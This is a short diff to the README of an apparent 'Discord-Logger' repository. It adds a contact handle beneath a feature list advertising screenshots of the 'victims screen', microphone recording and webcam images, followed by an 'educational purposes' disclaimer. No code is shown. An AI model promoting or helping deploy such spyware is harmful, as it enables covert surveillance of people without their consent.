@@ -29,7 +29,8 @@ Go to https://github.com/TurtlesXD/Discord-Logger/blob/main/discord-logger-help/
 • Screenshot victims screen\
 • Mic recording\
 • Webcam image\
-Thanks for checking out my repository!
+Thanks for checking out my repository!\
+Contact at chickenpie8636
 ```
 Note: This is for educational purposes, i do not condone the use of this script on people without their consent!
 ```
